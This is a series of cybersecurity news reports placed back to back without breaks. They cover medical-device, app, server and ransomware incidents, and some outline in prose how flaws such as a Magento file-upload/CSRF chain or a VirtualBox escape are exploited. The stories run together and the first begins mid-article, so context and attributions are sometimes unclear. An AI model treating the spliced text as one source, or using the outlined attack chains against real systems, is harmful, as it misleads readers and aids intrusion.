Last week, the Food and Drug Administration along with the Department of Homeland Security confirmed at least some of MedSec's findings and reported a flaw in the St. Jude @Merlin transmitter, an at-home computer that sends data from cardiac implants to the patient's medical team.
The flaw could have allowed malicious hackers to remotely exhaust an implant's battery power or potentially harm the patient.
St. Jude spokeswoman Candace Steele Flippin said in an emailed statement that following the release of Muddy Waters' claims in August, the device manufacturer ""carefully reviewed the claims in these reports along with our existing plans for our cyber ecosystem,"" evaluated them with FDA, DHS, and outside security researchers, and then identified the improvements announced on Jan. 9 and noted further enhancements ""we will be making in the coming months.""
But Muddy Waters said the problems may take as long as two years to fix.
Carson Block, the firm's founder, said this week the root causes of the vulnerabilities demand a change to firmware inside the St. Jude implants themselves.
The firm said in a statement, ""these issues have just been given a quick fix by St. Jude with the government's blessing and cardiologists should go with other pacemaker manufacturers since they are much better on cybersecurity.""
It's important to note that all the players in this medical legal drama, as well as the Veterans Affairs Department, which buys St. Jude devices, say there have been no reports of patient harm related to the cybersecurity vulnerabilities reported late August.
In fact, the VA in recent months has continued paying for operations involving St. Jude  devices, according to contract documents.
Ever since the US government and St. Jude confirmed the one flaw, the VA has been ""taking steps to be sure all our patients and providers are aware of this issue and take appropriate actions to be sure that all our patients get the update for their monitor,” said Merritt Raitt, acting director of the VA National Cardiac Device Surveillance Program.
The controversy could have been partly avoided, perhaps, if St. Jude and MedSec had followed new federal regulations for medical device security that encourage manufacturers to be more proactive about addressing potential vulnerabilities.
A week before federal regulators publicized the one St. Jude glitch on Jan. 9, they announced the completion of a 2016 draft policy that might have yielded multiple fixes in two months without anyone resorting to public shaming or legal action.
On Jan. 4, DHS circulated the final Food and Drug Administration (FDA) cybersecurity guidelines for monitoring networked medical devices on the market that threaten manufacturers with penalties such as a recall unless they cooperate with bug hunters to patch vulnerabilities within 60 days.
Corman recommends that providers, including VA, heed all the literature that's been published on the St. Jude glitches, including a DHS technical advisory, FDA security communication, MedSec report, and guidance written by Bishop Fox, a cybersecurity consultancy Muddy Waters hired in response to the lawsuit.
""Just understand that the FDA and DHS do need to get the ground truth, that security researcher claims do need to be validated through the normal regulatory process,"" he says.

Wishbone, the social media-based quiz app for teens and young adults, has been compromised, leading to more than 9.4 million records going up for sale on the Dark Web.
The breach gave the attackers access to Wishbone users’ user names, any real or nicknames provided by users during account registration, email addresses and telephone numbers, according to an email sent by the company to users, posted to Pastebin.
According to independent researcher Troy Hunt, the database was a MongoDB file that may have been inadvertently left open to the internet. The leak may have stemmed from a vulnerability in a Wishbone API, the company confirmed to Motherboard—one that the company has now closed, it said.
Parents should look through the settings of Wishbone, and any other app their children are using, to see if any personal information is stored in them. And, having a talk with kids about the dangers of exposing information should be at the top of the to-do list. Hunt has also published the leak to his searchable HaveIBeenPwned database, so parents can find out if their child is a victim.
“Teenagers today are constantly connected and sharing all aspects of their daily life is normal as there is a lot of peer pressure to participate in social apps,” said Sanjay Kalra, co-founder and chief product officer at Lacework, a provider of cloud security solutions. “Being a parent of [a] teenager in this hyper-social environment is a scary aspect. You cannot control information once exposed. Parents should be in constant communication with their teenagers, explaining the risks associated with information sharing and training them on basics of internet security. They should be educating them on how to use multiple strong passwords, anonymization of the data and identities and long-term effects of having personal aspects of life in public domain.”

IBM has discovered 17 zero-day vulnerabilities in smart city systems which could debilitate core services.
At the Black Hat conference in Las Vegas on Monday, the cybersecurity firm's X-Force Red team of penetration testers and hackers demonstrated how old-school threats are placing the cities of the future at risk in the present day.
Smart city technology spending is predicted to hit $80 billion this year and become as high as $135 billion by 2021. Water and filtration systems, smart lighting, traffic controllers, utilities, and more all become intertwined in smart cities, which aim to make urban living more energy efficient, eco-friendly, and manageable.
However, connecting all of these critical elements can have devastating effects should something go wrong -- such as a successful cyberattack.
We've already seen the damage which can be caused when threat actors target core country systems, such as in the case of Ukraine's power grid, and unless security is considered every step of the way, every future city will be placed at similar levels of risk.
Together with researchers from Threatcare, IBM X-Force Red discovered that smart city systems developed by Libelium, Echelon and Battelle were vulnerable to attack.
Libelium is a wireless sensor network hardware manufacturer, while Echelon specializes in industrial IoT, and non-profit Battelle develops and commercializes related technologies.
According to IBM X-Force Red researcher Daniel Crowley, out of the 17 previously-unknown vulnerabilities discovered in systems used in four smart cities, eight are deemed critical in severity.
Unfortunately, many of the bugs were due to poor, lax security practices -- such as the use of default passwords, authentication bypass, and SQL injections.
In total, the researchers uncovered four instances of critical pre-authentication shell injection flaws in Libelium's wireless sensor network, Meshlium.

A Russian vulnerability researcher and exploit developer has published detailed information about a zero-day vulnerability in VirtualBox. His explanations include step-by-step instructions for exploiting the bug.
According to the initial details in the disclosure, the issue is present in a shared code base of the virtualization software, available on all supported operating systems.
Exploiting the vulnerability allows an attacker to escape the virtual environment of the guest machine and reach the Ring 3 privilege layer, used for running code from most user programs, with the least privileges.
Turning one ""overflow"" into another
Sergey Zelenyuk found that the security bug can be leveraged on virtual machines configured with the Intel PRO/1000 MT Desktop (82540EM) network adapter in Network Address Translation (NAT) mode, the default setup that allows the guest system to access external networks.
""The [Intel PRO/1000 MT Desktop (82540EM)] has a vulnerability allowing an attacker with root/administrator privileges in a guest to escape to a host ring3. Then the attacker can use existing techniques to escalate privileges to ring 0 via /dev/vboxdrv,"" Zelenyuk writes in a technical write-up on Tuesday.
Zelenyuk says that an important aspect in getting how the vulnerability works is to understand that context descriptors are processed before data descriptors.
The researcher describes the mechanics behind the security flaw in detail, showing how to trigger the necessary conditions to obtain a buffer overflow that could be abused to escape the confinements of the virtual operating system.
First, he caused an integer underflow condition using packet descriptors - data segments that allow the network adapter to track network packet data in the system memory.
This state was then leveraged to read data from the guest OS to into a heap buffer and cause an overflow condition that could lead to overwriting function pointers; or to cause a stack overflow condition.

An unpatched vulnerability in the Magento e-commerce platform could allow hackers to upload and execute malicious code on web servers that host online shops.
The flaw was discovered by researchers from security consultancy DefenseCode and is located in a feature that retrieves preview images for videos hosted on Vimeo. Such videos can be added to product listings in Magento.
The DefenseCode researchers determined that if the image URL points to a different file, for example a PHP script, Magento will download the file in order to validate it. If the file is not an image, the platform will return a ""Disallowed file type"" error, but won't actually remove it from the server.
An attacker with access to exploit this flaw could achieve remote code execution by first tricking Magento to download an .htaccess configuration file that enables PHP execution inside the download directory and then downloading the malicious PHP file itself.
Once on the server, the PHP script can act as a backdoor and can be accessed from an external location by pointing the browser to it. For example, attackers could use it to browse the server directories and read the database password from Magento's configuration file. This can expose customer information stored in the database, which in the case of online shops, can be very sensitive.
The only limitation is that this vulnerability cannot be exploited directly because the video-linking functionality requires authentication. This means attackers need to have access to an account on the targeted website, but this can be a lower-privileged user and not necessarily an administrator.
The authentication obstacle can also be easily overcome if the website doesn't have the ""Add Secret Key to URLs"" option turned on. This option is intended to prevent cross-site request forgery (CSRF) attacks and is enabled by default.
CSRF is an attack technique that involves forcing a user’s browser to perform an unauthorized request on a website when visiting a different one.
""The attack can be constructed as simple as <img src=… in an email or a public message board, which will automatically trigger the arbitrary file upload if a user is currently logged into Magento,"" the DefenseCode researchers said in an advisory. ""An attacker can also entice the user to open a CSRF link using social engineering.""
This means that by simply clicking on a link in an email or by visiting a specifically crafted web page, users who have active Magento sessions in their browser might have their accounts abused to compromise websites.
The DefenseCode researchers claim that they've reported these issues to the Magento developers back in November, but received no information regarding patching plans since then.
Several versions of the Magento Community Edition (CE) have been released since November, the most recent one being 2.1.6 on Tuesday. According to DefenseCode, all Magento CE versions continue to be vulnerable, which is what prompted them to go public about the flaw.
“We have been actively investigating the root cause of the reported issue and are not aware of any attacks in the wild,” Magento, the company that oversees development of the e-commerce platform, said in an emailed statement. “We will be addressing the issue in our next patch release and continue to consistently work to improve our assurance processes.”
""All users are strongly advised to enforce the use of 'Add Secret Key to URLs' which mitigates the CSRF attack vector,"" the DefenseCode researchers said. ""To prevent remote code execution through arbitrary file upload the server should be configured to disallow .htaccess files in affected directories.""
Magento is used by over 250,000 online retailers, making it an attractive target for hackers. Last year, researchers found thousands of Magento-based online shops that had been compromised and infected with malicious code that skimmed payment card details.

New variants of an Android ransomware family have surged over the past six months to some 600 unique versions.
That's a dramatic jump from the 100 variants created between October to the start of December, says Michael Covington, vice president of product strategy for Wandera, which published new data on the ransomware today.
The new strains of the mobile ransomware use a range of disguises to avoid detection. The SLocker variations are repackaged as altered icon, for example, or offer unique resources and executable files. SLocker encrypts images, documents, and videos, as well as blocks access to the device before demanding payment to unlock the phone and its contents.
Chief security officers and their teams have reason to worry about the rapid rise in the number of SLocker strains, say security experts. The malware has morphed beyond just locking users' screens on their Android devices and demanding payment, to taking over administrative rights and controlling the device, including its microphone, speakers, and the camera.
Bogdan Botezatu, senior e-threat analyst with Bitdefender, says an Android smartphone infected with SLocker could potentially broadcast highly sensitive information presented during a closed-door boardroom meeting without the user's knowledge, for example.
Wandera's Covington points to potential risks to sales and consulting staff, for example. ""In a lot of situations where the employees work out in the field like in sales or consulting, it can have a massive impact on their business if they are locked out of their phone and data,"" he explains.
Victim organizations paid an estimated $10 million in ransom to unlock confidential data stored on Android phones that fell victim to SLocker, according to Wandera's report.

Android ransomware first emerged in 2014, after creators of the Reveton/IcePol ransomware for PCs turned their attention to Android devices and cooked up the Android.Trojan. Koler.A and then later Android.Trojan.SLocker, according to Bitdefender's Botezatu.
For the first two years, SLocker was among the top 20 Android malware families and then shot up to the top 10 in 2016, notes Botezatu. ""Its rise to the top 10 was mostly because of the frustration factor. It's a psychological thing when people can't get information from their smartphone,"" he says. ""People were willing to pay the ransom. The mobile device is more personal than the personal computer.""
But now SLocker ranks in the No. 14 to No. 18 spot among the top 20 Android malware families, as cyberthieves create new types of Android malware and enlarge the pool of contenders and dilute SLocker's influence, Botezatu says.

The breach indicates even more capable Asian states are struggling to confront cyber threats.
On February 28, Singapore’s defense ministry (MINDEF) disclosed that a breach in an Internet-connected system earlier this month had resulted in the personal data of 850 national servicemen and employees being stolen.
Though the impact of the breach was quite limited, it nonetheless highlights the difficulties that Singapore faces as it confronts its growing cyber challenge.
According to MINDEF, the I-net system used by personnel to access the Internet through terminals at the ministry and other facilities was breached by an attack in early February.
While personal data, including identification numbers, phone numbers, and date of birth, were believed to have been stolen during the incident, the ministry said no classified information was compromised because it is stored on a separate system not connected to the Internet.
As I have noted before, it has been paying keen attention to the cyber domain as a developed, highly-networked country.
Singapore is particularly vulnerable as it relies on its reputation for security and stability to serve as a hub for businesses and attract talent.
Indeed, last year, Deloitte found that Singapore was among the five Asian countries most vulnerable to cyber attacks (See: “Singapore Among Most Vulnerable to Cyberattacks in Asia”).
In response, Singapore has unveiled a series of initiatives aimed at boosting cybersecurity, including creating new institutions, safeguarding critical infrastructure, training cyber security personnel, and collaborating more with the private sector (See: “Singapore’s Cyber War Gets a Boost”).
And as I noted before, Prime Minister Lee Hsien Loong also outlined Singapore’s overall cybersecurity strategy at the inaugural Singapore International Cyber Week in October last year (See: “Singapore Unveils New ASEAN Cyber Initiative”).
Nonetheless, the cyber attack this week is a reminder that even the more capable states in the Asia-Pacific continue to struggle with confronting threats in the cyber realm.
This was the first publicly disclosed cyber attack that MINDEF has experienced, and the ministry has described it as “targeted and carefully planned,” with the purpose of gaining access to official secrets.
And based on what Singaporean officials have discovered so far, the attack appears to be less like the work of regular hackers and more along the lines of sophisticated state or state-backed actors.

Microsoft released a security update designed to patch remote code execution (RCE) and information disclosure vulnerabilities in its Microsoft Exchange Server 2019, 2016, and 2013 products.
The RCE security issue is being tracked as CVE-2019-0586 and according to Microsoft's advisory it exists because ""the software fails to properly handle objects in memory.""
Attackers can run code as System user
Following a successful attack of a vulnerable Microsoft Exchange Server installations, potential attackers would be able to take advantage of System user permissions.
    An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the System user. An attacker could then install programs; view, change, or delete data; or create new accounts.
In order to exploit the CVE-2019-0586 vulnerability, attackers have to send maliciously crafter emails to a vulnerable Exchange server. The issue has been addressed by changing the way Microsoft Exchange handles objects in memory.
The information disclosure Microsoft Exchange Server vulnerability was assigned the CVE-2019-0588 tracking id and it is caused by the way Microsoft Exchange's ""PowerShell API grants calendar contributors more view permissions than intended.""
    To exploit this vulnerability, an attacker would need to be granted contributor access to an Exchange Calendar by an administrator via PowerShell. The attacker would then be able to view additional details about the calendar that would normally be hidden.
The CVE-2019-0588, security vulnerability was fixed by correcting the way Exchange's PowerShell API grants permissions to contributors.
Microsoft rated the two vulnerabilities as 'Important'
Microsoft assigned an Important severity level to both security issues and, until their public disclosure, no mitigation factors or workarounds have been found.
On servers that are using user account control (UAC) the update may fail to install if the update packages are run without Administrator privileges.

Warning the device is susceptible to denial of service attacks, Cisco Systems on Wednesday released a patch for its NetFlow Generation Appliance.
The flaw traces back to the hardware’s Stream Control Transmission Protocol (SCTP) used by the appliance, according to a Cisco Security Advisory posted Wednesday.
Cisco warns the vulnerability, “could allow an unauthenticated, remote attacker to cause the device to hang or unexpectedly reload, causing a denial of service (DoS) condition”.
The bug (CVE-2017-3826) is due to incomplete validation of SCTP packets being monitored on the NGA data ports, Cisco wrote.
It impacts Cisco NetFlow Generation Appliances NGA 3140, NGA 3240 and NGA 3340.
NetFlow Generation Appliances are located within enterprise data centers and designed to monitor Gigabit Ethernet high-throughput networks.
An attacker exploiting the vulnerability, “could exploit this vulnerability by sending malformed SCTP packets on a network that is monitored by an NGA data port.
SCTP packets addressed to the IP address of the NGA itself will not trigger this vulnerability.
An exploit could allow the attacker to cause the appliance to become unresponsive or reload, causing a DoS condition,” Cisco said.
While there are no workarounds to fix the vulnerability, Cisco is urging users to apply an update that fixes the bug, Cisco NetFlow Generation Appliance Software release 1.1 (1a).
The company added that the fix does not apply to NGA 3140 because that platform was sunsetted January 11, 2014.
Last month, Cisco patched an authentication bypass vulnerability in its Cisco Prime Home hardware.
In January, Cisco patched a flaw rated critical found in is WebEx Chrome Plugin, used by tens of millions for web conferencing in business environments, that exposed computers to remote code execution.
Cisco Systems released a patch Monday to fix a critical security vulnerability, with a CVSS rating of 10, in its Secure Sockets Layer VPN solution called Adaptive Security Appliance.

Ransomware, a special version of trojan that encrypts files, has become a new and tremendously growing type of cybercrime.
The 2016 Ransomware Report released by 360 Security Center lately presents that:
– 4.9 million computers were attacked in China
 – 56,000 ransomware infections worldwide only in March 2016
 – $1 billion dollar source of income for cyber criminals estimated by FBI
 – Almost half of organizations have been hit with ransomware
In January 2016, three Indian banks’ and a pharmaceutical company’s computer systems were infected by ransomware.
The attacker asked for 1 bitcoin (about $905) for each infected computer, and then used unprotected desktop interface to infect other connected computers from remote.
These corps lost several million dollars due to the huge number of infected computers .
February 5th 2016, Hollywood Presbyterian Medical Center paid a $17,000 ransom in bitcoin to a hacker who seized control of the hospital’s computer systems and would give back access only when the money was paid.
Two hospitals in Ottawa and in Ontario were attacked by ransomware later on.
In February 2016, several schools’ computer systems were attacked by ransomware.
The hacker took control of the intranet and servers, and asked for 20 bitcoin.
These school ended up paying the anonymous hacker $8,500 to get their IT systems back.
In the mid-February, a new ransomware “Locky” started to spread out via email.
7 out of 10 malicious email attachments delivered Locky in Q2 2016.
Once users activated the file attached in the email, their files were encrypted and had to pay the distributor a certain ransom to decrypt these files.
May 2016, a series of ransomware attacks on the House of Representatives have led US congress to ban using Yahoo Mail and Google hosted-apps, and warned their members about being caution of Internet security.
In October, 2016, 277 ransomware attacks were reported to Government Computer Emergency Response Team in Hong Kong, China.
Most of the malware were hidden in email attachments and disguised as bills or receipts to trick users to click.
The victims included the Marine Department of Hong Kong and Deloitte, one of the biggest accounting firms in the world.
In November 2016, other than emails, Locky began to transmit through social networks such as Facebook, LinkedIn with images contained malicious application.
The file could be automatically downloaded while users were browsing, and installed once users clicked to check.
November 2016, San Francisco public transportation system Muni was hacked and requested for a $73,000 ransom in bitcoin to get back encrypted data.
SFMTA (The San Francisco Municipal Transportation Authority) refused to pay the ransom and shut down the fair system.
We can see that ransomeware is terrifying and collecting money illegally around the world.
However, it’s almost impossible to decrypt the infected files by yourself, even for people with high information technology skills.

The Cyber Cell of Navi Mumbai police is investigating the case, DCP Doshi said. ""We are trying to ascertain the Internet Protocol Address (IP) from where the email (demanding ransom) originated,"" Doshi said
Computer systems of a private hospital in Navi Mumbai have come under a malware attack, with attackers seeking ransom in Bitcoins, police today said. The cyber attack on the computer systems of Mahatma Gandhi Mission Hospital came to light on July 15, police said.
Hospital administrators found the systems locked, with an encrypted message by unidentified attackers demanding ransom in Bitcoins to unlock it, said Tushar Doshi, Deputy Commissioner of Police (Crime).
Authorities found that access to the data of the previous 15 days had been blocked. Such attacks are described as `ransomware' attacks,
where a malicious software enters the victim's computer system, and the attackers threaten to publish the data or block access to it unless a ransom is paid.

Cloquet school district has been hit by a ransomware attack second time in the past three years. The ransomware is a virulent computer malware, which attacks by spreading from one computer to another and locking up the access to the network servers. The ransomware also encrypts the documents and then demands ransom for providing a key to unlock encrypted files.
In March 2016, the previous occasion when the ransomware attacked, the district cancelled the school for one day so as to let the technology staff have time for recovering from the malware. During that attack, the district servers as well as over 600 computers got infected badly.
The current attack took place during the summer vacation, and was not as harmful as of last time. As per staff report from T.J. Smith, Cloquet School District Technology Director, the virus has encrypted files available on all the servers except one, this included the network shared drives. However, the attack does not indicate stealing of any information. The virus only encrypted the files, so that the users were not able to open them.
Board members of Cloquet School were explained by Smith on 13 Aug, 2018, that the district only was left with two options other than succumbing to the demands of ransom by the hacker - one, trying to recover data with a probability that the data may not be retrieved and then it would be a complete waste of money and time. The second option was to plan out the way of recreating the data and rebuilding the affected servers.
Smith, however, advocated for second option as the data lost was not so important and the insurance will help in paying out for recovering the infected servers. Unanimously, the board members also voted for second option, which is recreating the data and rebuilding the affected servers. Besides, the board members suggested hiring a ""forensic"" company to investigate on the ransomware attack and determine the source from where the virus has entered.
On a brighter side, Smith revealed that the technology staffs have been able to recover some of the lost data, and they are also capable of recreating the data that is unrecoverable. He also commented that the process of recovery will not at any cost affect the commencement of the school session in the month of September.

"
The gang behind the attacks has compromised technology service firms and plans to use them as a proxy for attacks, security firms have said.
The group, dubbed APT10, is using custom-made malware and spear phishing to gain access to target companies.
The National Cyber Security Centre and cyber units at PwC and BAE Systems collaborated to identify the group.
""Operating alone, none of us would have joined the dots to uncover this new campaign of indirect attacks,"" said Richard Horne, cyber security partner at PwC.
A detailed report drawn up by the three organisations reveals that the group has been active since 2014 but ramped up its attacks in late 2016.
In particular, said the report, it targeted firms who ran key IT functions on behalf of large UK companies.
PwC and BAE said the group had mounted many different attacks as part of a campaign they called Operation Cloud Hopper.
By targeting the suppliers of IT outsourcing, the attackers were able to stealthily gain access to the networks and systems of their true targets.
Dr Adrian Nish, head of threat intelligence at BAE, said the attackers used these third parties as a ""stepping stone"" to get at the companies and organisations they were really interested in.
Infiltrating supply chains gave the attackers an easy route into many different targets.
""Organisations large and small rely on these providers for management of core systems and as such they can have deep access to sensitive data,"" he said.
""It is impossible to say how many organisations might be impacted altogether at this point.""
The security organisations involved in exposing the APT10 campaign say they have seen firms in the UK, Europe and Japan being targeted by the group.
The National Cyber Security Centre and the two security firms have warned known victims that they have been compromised.
Spear phishing emails booby-trapped with custom-made malware were sent to key staff in IT services firms in the first stage of an attack.
Once the hackers had won access they sought out intellectual property and other sensitive data.
The hacking group maintained a massive network of sites and domains online to serve their various attacks and as a conduit for data they stole, said Dr Nish.
Forensic analysis of the times when the attackers were most active as well as the tools and techniques they used led PwC and BAE to conclude that the group was based in China.
They have not established who is behind the APT10 group or how it chooses its targets.

Over a third of British businesses (36 percent) are not very confident that efforts to completely eradicate a recent ransomware attack from work systems have been successful.
The research, carried out by One Poll, quizzed 500 IT decision makers in companies with 250 or more employees across the UK to uncover the extent to which large British organisations are prepared for the threat of ransomware.
The research also considered the proportion of businesses which have been targeted with a successful ransomware attack and the current impact of these attacks on corporate devices.
45 percent of large British businesses have fallen victim to a successful ransomware attack.
Despite this, 11 percent of large organisations still do not have a formal ransomware policy in place.
Although British businesses are increasingly threatened by this strain of malware, 38 percent of these unprepared businesses are not planning to implement a ransomware-focused policy in the next 12 months.
Conversely, half of this group confirmed that firm plans are in place to put such a policy into practice in the next year.
“Cybercriminals are continuing to exploit British businesses by launching ransomware attacks to remove access to mission-critical data or to make significant sums of money by demanding large ransoms for the safe return of such data.
Despite this, many organisations have yet to take action and implement policies which will ensure the IT network is well prepared for a possible attack,” said Chris Mayers, chief security architect, Citrix.
“By committing to robust cybersecurity techniques and ensuring specific policies are in place in case of an attack, companies can lessen the chances of falling prey to ransomware and creating any vulnerabilities for cyber-attackers to find”.
The poll also dug into the extent to which ransomware attacks have affected corporate devices and systems, revealing that IT often faces significant numbers of infected devices.
On average, businesses reported that 47 devices had been infected by their most recent ransomware attack but one third of businesses with over 1000 employees reported that more than 101 devices were affected.
Among those organisations which had fallen victim to a ransomware attack, 31 percent saw 25 or fewer devices affected.
“Falling prey to a ransomware campaign can have a devastating effect on a business, from the loss of highly sensitive corporate data to reduced revenues and a sharp decline in public trust.
It’s worrying to see many businesses are concerned that ransomware may be lingering on the corporate network after mitigation efforts have taken place, particularly when it can spread across many different devices,” Chris Mayers added.

Intel’s newly announced 9-series CPUs bring a lot of exciting new features to the table, including higher clock speeds and the promise of greater gaming performance. But arguably one of the most important factors is in security. These chips are the first generation of new desktop CPUs to come with hardware fixes for the Spectre and Meltdown bugs which emerged in recent years.
In particular, it’s the new K-series of gaming CPUs that are receiving the fix. Those chips come with changes at the hardware level and should be far more secure against the kind of attacks that Spectre and its ilk have brought to light in recent years. Although they are still based on the same 14nm node that has dominated Intel’s chip designs since 2014, these would be the first ones to come with a fix for these sorts of bugs at the hardware level.
The second set of new 9th-gen chips, the X-series (and Xeon-class chips), don’t have those same security fixes. Because they’re based on the older Skylake-X architecture, Intel is relying solely on software updates to keep them protected against these possible vulnerabilities.
News of the fixes were shared at Intel’s recent desktop press event, where it stated that, “the new desktop processors include protections for the security vulnerabilities commonly referred to as ‘Spectre,’ ‘Meltdown,’ and ‘L1TF.’ These protections include a combination of the hardware design changes we announced earlier this year as well as software and microcode updates.”
The hardware alterations made to the chips protect against Meltdown V3, otherwise known as the rogue data cache load bug. The L1 terminal fault exploit was also shored up with hardware changes. Software and microcode changes protect those same chips against the Spectre V2 branch target injection bug, the Meltdown V3, a rogue system register read, and the variant V4 speculative store bypass flaw.
In the laptop world, Intel has had a similar approach toward making hardware-level fixes. Some, but not all, have implemented hardware protections. Intel has been criticized in the past for the way it has handled these potentially critical flaws and has had a relatively slow move toward patching the vulnerabilities on a hardware level throughout 2018.

If you’re using one of the many QNAP NAS devices and you haven’t yet upgraded the QTS firmware to version 4.2.4, you should do so immediately if you don’t want it to fall prey to attackers.
Among the vulnerabilities fixed by QNAP in this latest firmware version, released on March 21, are three command injection flaws in the web user interface that can be exploited to gain remote command execution on a vulnerable device as administrative user (root).
And among these three, one can be exploited by an unauthenticated attacker, via a specially crafted HTTP request.
A thusly compromised NAS device can be used for further attacks, but what should worry users even more, is that an attacker can read, modify or remove content from it at will.
The flaws were discovered by Harry Sintonen of F-Secure, and responsibly disclosed to QNAP.
But, given that Sintonen has now released more information about each vulnerability, it’s not inconceivable that attackers might craft working exploits soon, and try to use them.
The vulnerabilities are confirmed to affect QTS versions 4.2.2 and 4.2.3.
Users are advised to install the firmware update version 4.2.4 build 20170313, or restrict access to the web user interface (ports 8080 and 443).

Thousands, if not more, Jenkins servers are vulnerable to data theft, takeover, and cryptocurrency mining attacks. This is because hackers can exploit two vulnerabilities to gain admin rights or log in using invalid credentials on these servers.
Both vulnerabilities were discovered by security researchers from CyberArk, were privately reported to the Jenkins team, and received fixes over the summer. But despite patches for both issues, there are still thousands of Jenkins servers available online.
Jenkins is a web application for continuous integration built in Java that allows development teams to run automated tests and commands on code repositories based on test results, and even automate the process of deploying new code to production servers.
Jenkins is a popular component in many companies' IT infrastructure and these servers are very popular with both freelancers and enterprises alike.
Over the summer, CyberArk researchers discovered a vulnerability (tracked as CVE-2018-1999001) that allows an attacker to provide malformed login credentials that cause Jenkins servers to move their config.xml file from the Jenkins home directory to another location.
If an attacker can cause the Jenkins server to crash and restart, or if he waits for the server to restart on its own, the Jenkins server then boots in a default configuration that features no security.
In this weakened setup, anyone can register on the Jenkins server and gain administrator access. With an administrator role in hand, an attacker can access private corporate source code, or even make code modifications to plant backdoors in a company's apps.
This lone issue would have been quite bad on its own, but CyberArk researchers also discovered a second Jenkins vulnerability --CVE-2018-1999043.
This second bug, they said, allowed an attacker to create ephemeral user records in the server's memory, allowing an attacker a short period when they could authenticate using ghost usernames and credentials.
Both vulnerabilities were fixed, the first in July and the second in August, but as we've gotten accustomed to in the past few years of covering security flaws, not all server owners have bothered to install these security updates.

Researchers from security firm ERPScan have disclosed a vulnerability in the SAP GUI application which it has described as perhaps the most dangerous SAP issue since 2011, as it affects not only every SAP customer but also every user.
The vulnerability allows an attacker to make all endpoints with compromised SAP GUI clients automatically install malware that locks their computers when an SAP user logs in to the system.
When the user next logs into the SAP GUI application, the malicious software will run and prevent them from logging on to SAP Server.
Firstly, in this case, patching process is especially laborious and time-consuming, as the vulnerability affects client side, so an SAP administrator has to apply the patch on every endpoint with SAP GUI in a company and a typical enterprise has thousands of them,” said Vahagn Vardanyan, senior security researcher, ERPScan.
The vulnerability was patched by SAP with a fix as part of its March Security Note 2407616.
An SAP spokesperson confirmed that a SAP GUI vulnerability was fixed in the March Patch Day, with further details available via this blog post.
“It has a priority of High, based on CVSS rating of 8.0 (but not Very High).
We have no information or evidence of this vulnerability being exploited at a customer but advise all customers to patch their infrastructure immediately.
Customers are required to apply the SAP GUI patch released on their landscape using their standard client software distribution and update tools (which they would have in place for end-user software licensed from other vendors as well),” the spokesperson said.

Every year, cybercriminals cash in on tax season by targeting individuals, but this year it's a little different.
It's businesses that must be extra careful when filing, because businesses are experiencing a rise in tax-related scams, specifically W-2 fraud.
Researchers at IBM X-Force, the tech giant's security research division, discovered more than 1400% growth in general tax-themed spam between December 2016 and March 2017.
""On top of all the usual activity -- consumer tax fraud, filing on others' behalf -- we began to see that businesses are being targeted a lot more,"" says Limor Kessem, executive security advisor for IBM Security.
In the past, she says, tax fraud on businesses were the purview of only advanced attackers.
This year, they saw a rise in social engineering attacks on smaller organizations like schools, non-profits, and restaurants as fraudsters start to aim for the ""low-hanging fruit"" of the corporate world.
Cybercriminals often collect W-2 data by pretending to be a company exec and emailing HR or payroll for employee information, which is used to file fraudulent returns and collect refunds.
In addition, they may also request a wire transfer to a specific bank account.
Attackers who are more technically inclined may bypass the fake emails and breach an organization's servers to steal data directly, says Kessem.
In addition to using W-2 data for their own scams, fraudsters will sell it on the dark web, the report states.
The most valuable bundles of information are called ""Fullz"" and contain the victim's address, contact info, Social Security and driver's license numbers, plus all W-2 and W-9 information.
Each record runs for $40-$50 in Bitcoin on the Dark Web.
With all this data for $50 per record, harmful activity doesn't have to stop at tax fraud, Kessem notes.
Cybercriminals can buy and use this data for other scams like identity theft or online loan applications.
Tax-related risks increase as the filing deadline approaches.
One-third of Americans (54 million people) filed their taxes after April 1 in 2016, giving fraudsters a larger window of opportunity to strike.
Tax-related cybercrime won't stop after April 18, 2017.
""There are a number of people filing after the deadline,"" says Kessem, noting the popularity of extensions.
There are millions who will still be interested in tax-themed emails.""
However, their tax scam strategies will shift after the deadline as cybercriminals move from stealing data to infecting machines with malware.
Because victims may expect messages indicating problems with their returns, they are more likely to open potentially malicious attachments, Kessem explains.
Researchers believe data sets sold on the Dark Web are a sign that fraudsters are stealing tax info from employer databases -- meaning they get it before the taxpayers.

Mobile app breaches represented less than 3% of all computer records hacked last year, according to the Identity Theft Research Center, a San Diego tracking firm. But don’t get cozy.
A veritable flood of consumers is heading for mobile, according to Juniper Research. It predicts over 3 billion people around the world will be banking on mobile by 2021 — quite a lure for hackers who target financial apps. That means more people are likely to fall prey, so bank customers will need to be ready to protect their devices and their bank accounts.
Criminals try to access mobile apps in a number of ways.

When a mobile app communicates with a financial institution’s server over the internet, the app verifies the bank’s or credit union’s identity by checking its server certificate.
With a man-in-the-middle attack, fraudsters will try to “listen in” on this network traffic, perhaps by accessing the same public Wi-Fi network as the mobile user, and attempt to send a fake bank server certificate to the mobile app.
If the app accepts the fake certificate, it could let the hacker receive the user’s personal information.

When installed on a mobile device, key logger programs secretly record a person’s actions as he or she uses the device. With a banking app, the malicious software could log your account names, numbers and passwords and send them to a hacker.

It’s been around for years, but this tried and true hack is still popular with criminals, says Doug Johnson, senior vice president of payments and cybersecurity policy at the American Bankers Association. It occurs when a fraudster pretends to be a legitimate financial institution that asks a mobile user to submit private bank information.
Many phishing attempts bypass mobile apps completely. A hacker could send emails telling people their account is locked and asking them to reply to the message with their account username and password. But the account isn’t locked, and the information a person sends would go to the criminal, not the bank.

Positive Technologies has today confirmed it has detected vulnerabilities in SAP Enterprise Portal Navigation, SAP NetWeaver Log Viewer and SAP Enterprise Portal Theme Editor, which are the components of the SAP NetWeaver platform. By exploiting these security flaws, attackers can intercept login credentials, register keystrokes, spoof data or perform other illegal activities that could potentially lead to a system compromise.
Four Cross-Site Scripting (XSS) vulnerabilities were detected in the following SAP Enterprise Portal components: SAP Enterprise Portal Navigation (CVSSv3 score 6.1) and SAP Enterprise Portal Theme Editor (three flaws with CVSSv3 scores 5.4, 6.1, and 6.1). 
Exploiting these vulnerabilities, an attacker could obtain access to a victim's session tokens, login credentials or other sensitive information in the browser, perform arbitrary actions on the victim's behalf, rewrite HTML page content and intercept keystrokes. The relevant remediation guidelines are described in SAP Security notes No. 2369469, 2372183, 2372204, and 2377626.
